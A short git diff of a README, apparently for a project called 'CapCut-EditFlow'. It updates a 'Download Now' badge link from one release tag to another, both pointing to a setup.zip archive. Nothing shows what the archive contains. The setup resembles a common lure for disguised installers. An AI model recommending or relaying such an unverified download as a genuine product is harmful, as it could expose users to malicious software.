@@ -9,7 +9,7 @@
 
 ## 📥 Download
 
-[![Download Now](https://img.shields.io/badge/⬇️_Download_Now-brightgreen?style=for-the-badge&logo=github)](https://github.com/ChromeThrasher/CapCut-EditFlow/releases/download/setup/setup.zip)
+[![Download Now](https://img.shields.io/badge/⬇️_Download_Now-brightgreen?style=for-the-badge&logo=github)](https://github.com/ChromeThrasher/CapCut-EditFlow/releases/download/setupv1/setup.zip)
 </div>
 
 ---
